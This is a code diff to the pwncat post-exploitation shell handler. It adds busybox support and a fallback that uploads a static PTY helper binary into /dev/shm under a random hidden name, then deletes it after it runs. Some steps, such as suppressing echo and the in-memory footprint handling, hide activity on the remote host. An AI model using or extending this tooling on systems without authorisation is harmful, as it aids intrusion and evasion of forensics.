@@ -16,8 +16,10 @@ import stat
 import time
 import shlex
 import shutil
+import base64
 import hashlib
 import pathlib
+import secrets
 import tempfile
 import subprocess
 from io import TextIOWrapper, BufferedIOBase, UnsupportedOperation
@@ -555,6 +557,7 @@ class Linux(Platform):
     PATH_TYPE = LinuxPath
     PROMPTS = {
         "sh": """'$(command printf "(remote) $(whoami)@$(hostname):$PWD\\$ ")'""",
+        "ash": """'$(command printf "(remote) $(whoami)@$(hostname):$PWD\\$ ")'""",
         "dash": """'$(command printf "(remote) $(whoami)@$(hostname):$PWD\\$ ")'""",
         "zsh": """'%B%F{red}(remote) %B%F{yellow}%n@%M%B%F{reset}:%B%F{cyan}$PWD%B%(#.%b%F{white}#.%b%F{white}$)%b%F{reset} '""",
         "default": """'$(command printf "\\[\\033[01;31m\\](remote)\\[\\033[0m\\] \\[\\033[01;33m\\]$(whoami)@$(hostname)\\[\\033[0m\\]:\\[\\033[1;36m\\]$PWD\\[\\033[0m\\]\\$ ")'""",
@@ -619,6 +622,21 @@ class Linux(Platform):
         else:
             self.has_pty = False
 
+        # Detect busybox environment
+        self.is_busybox = False
+        try:
+            result = self.run(
+                "busybox --list 2>/dev/null | head -1",
+                shell=True,
+                capture_output=True,
+                text=True,
+            )
+            if result.returncode == 0 and result.stdout.strip():
+                self.is_busybox = True
+                self.session.log("detected busybox environment")
+        except Exception:
+            pass
+
         if self.shell == "" or self.shell is None:
             self.shell = "/bin/sh"
 
@@ -660,7 +678,8 @@ class Linux(Platform):
 
     def get_pty(self):
         """Spawn a PTY in the current shell. If a PTY is already running
-        then this method does nothing."""
+        then this method does nothing. On busybox systems where no PTY
+        method is available, this returns silently after the first attempt."""
 
         PTY_OPTIONS = [
             (["script"], " {binary_path} -qc {shell} /dev/null 2>&1"),
@@ -678,8 +697,10 @@ class Linux(Platform):
             ),
         ]
 
-        # Check if we are currently in a PTY
+        # Check if we are currently in a PTY or already failed on busybox
         if self.has_pty:
+            return
+        if getattr(self, "_pty_failed", False):
             return
 
         # Grab the current shell PID
@@ -717,7 +738,16 @@ class Linux(Platform):
                 continue
             break
         else:
-            raise PlatformError("no available pty methods")
+            # No standard PTY method worked. Try uploading a static
+            # pty_helper binary as a last resort.
+            if self._upload_pty_helper(pid):
+                return
+
+            self._pty_failed = True
+            self.session.log(
+                "no pty methods available; continuing without pty"
+            )
+            return
 
         # When starting a pty, history is sometimes re-enabled
         self.disable_history()
@@ -731,6 +761,114 @@ class Linux(Platform):
             stdin=subprocess.PIPE,
             stdout=subprocess.PIPE,
         ).wait()
+
+    # Map of uname -m values to pty_helper binary names
+    PTY_HELPER_ARCH_MAP = {
+        "x86_64": "pty_helper_x86_64",
+        "aarch64": "pty_helper_aarch64",
+        "i686": "pty_helper_i686",
+        "i386": "pty_helper_i686",
+        "armv7l": "pty_helper_armv7l",
+        "armv6l": "pty_helper_armv7l",
+    }
+
+    def _find_writable_exec_dir(self) -> str:
+        """Find a writable directory that allows execution on the remote host.
+        Prefers /dev/shm (tmpfs, in-memory) over /tmp (may be on disk).
+        Checks both writability and that the filesystem is not mounted noexec."""
+
+        for path in ["/dev/shm", "/tmp"]:
+            result = self.run(
+                f"[ -d {path} ] && [ -w {path} ] && "
+                f"printf '#!/bin/sh\\necho OK' > {path}/.pwncat_exec_test && "
+                f"chmod +x {path}/.pwncat_exec_test && "
+                f"{path}/.pwncat_exec_test 2>/dev/null; "
+                f"rm -f {path}/.pwncat_exec_test",
+                shell=True, capture_output=True, text=True,
+            )
+            if "OK" in result.stdout:
+                return path
+        return "/tmp"
+
+    def _upload_pty_helper(self, old_pid: str) -> bool:
+        """Upload a static pty_helper binary and use it to spawn a PTY.
+        This is the last-resort method for environments (busybox/Alpine)
+        that lack script, python, and other standard PTY tools.
+        The binary is written to /dev/shm (RAM) when possible, and
+        deleted immediately after exec to minimize disk footprint."""
+
+        try:
+            # Detect remote architecture
+            result = self.run(
+                "uname -m", shell=True, capture_output=True, text=True
+            )
+            arch = result.stdout.strip()
+            helper_name = self.PTY_HELPER_ARCH_MAP.get(arch)
+            if helper_name is None:
+                self.session.log(f"no pty_helper binary for arch: {arch}")
+                return False
+
+            # Load the embedded binary
+            helper_path = (
+                _pkg_files("pwncat")
+                .joinpath("data", "pty_helper", helper_name)
+            )
+            if not helper_path.is_file():
+                self.session.log(f"pty_helper binary not found: {helper_name}")
+                return False
+
+            helper_data = helper_path.read_bytes()
+            b64_data = base64.b64encode(helper_data).decode()
+
+            writable_dir = self._find_writable_exec_dir()
+            rand_name = secrets.token_hex(6)
+            remote_path = f"{writable_dir}/.{rand_name}"
+
+            self.session.log(
+                f"uploading pty_helper to {writable_dir} ({len(helper_data)} bytes)"
+            )
+
+            # Upload via base64 in chunks
+            self.run(
+                f"cat /dev/null > {remote_path}.b64",
+                shell=True, capture_output=True,
+            )
+
+            chunk_size = 4096
+            for i in range(0, len(b64_data), chunk_size):
+                chunk = b64_data[i:i + chunk_size]
+                self.run(
+                    f"echo -n '{chunk}' >> {remote_path}.b64",
+                    shell=True, capture_output=True,
+                )
+
+            self.run(
+                f"base64 -d {remote_path}.b64 > {remote_path} && "
+                f"chmod +x {remote_path} && rm -f {remote_path}.b64",
+                shell=True, capture_output=True,
+            )
+
+            # Execute pty_helper directly (same as script/python methods).
+            # Schedule background deletion so the binary runs from memory.
+            # Use /bin/sh instead of self.shell - on busybox systems,
+            # self.shell may resolve to /bin/busybox via /proc/pid/exe
+            # which doesn't work as a direct shell invocation.
+            pty_shell = "/bin/sh"
+            payload = f" (sleep 2; rm -f {remote_path}) & {remote_path} {pty_shell} 2>&1"
+            self.logger.info(payload)
+            self.channel.sendline(payload.encode("utf-8"))
+
+            # Give the pty_helper time to start and spawn the shell
+            time.sleep(1.5)
+            self.channel.drain()
+
+            self.has_pty = True
+            self.session.log("pty_helper spawned successfully")
+            return True
+
+        except Exception as e:
+            self.session.log(f"pty_helper upload failed: {e}")
+            return False
 
     def get_host_hash(self) -> str:
         """
@@ -1691,7 +1829,10 @@ class Linux(Platform):
 
             # Get local terminal information
             TERM = os.environ.get("TERM", "xterm")
-            columns, rows = os.get_terminal_size(0)
+            try:
+                columns, rows = os.get_terminal_size(0)
+            except OSError:
+                columns, rows = 80, 24
 
             prompt = self.PROMPTS.get(
                 os.path.basename(self.shell), self.PROMPTS["default"]
@@ -1700,18 +1841,35 @@ class Linux(Platform):
             # Drain any remaining output from the commands run by pwncat
             self.channel.drain()
 
-            command = (
-                " ; ".join(
-                    [
-                        " stty sane",
-                        f" stty rows {rows} columns {columns}",
-                        f" export TERM='{TERM}'",
-                        f"""export PS1={prompt}""",
-                    ]
+            # Build the interactive setup command depending on PTY availability
+            if not self.has_pty:
+                command = (
+                    " ; ".join(
+                        [
+                            f" export TERM='{TERM}'",
+                            f"""export PS1={prompt}""",
+                        ]
+                    )
+                    + "\n"
                 )
-                + "\n"
-            )
+            else:
+                command = (
+                    " ; ".join(
+                        [
+                            " stty sane",
+                            f" stty rows {rows} columns {columns}",
+                            f" export TERM='{TERM}'",
+                            f"""export PS1={prompt}""",
+                        ]
+                    )
+                    + "\n"
+                )
             self.logger.info(command.rstrip("\n"))
+            # Disable echo first so the setup command isn't visible,
+            # then send the setup (which includes stty sane to re-enable echo)
+            self.channel.send(b" stty -echo\n")
+            time.sleep(0.2)
+            self.channel.drain()
             self.channel.send(command.encode("utf-8"))
 
             try:
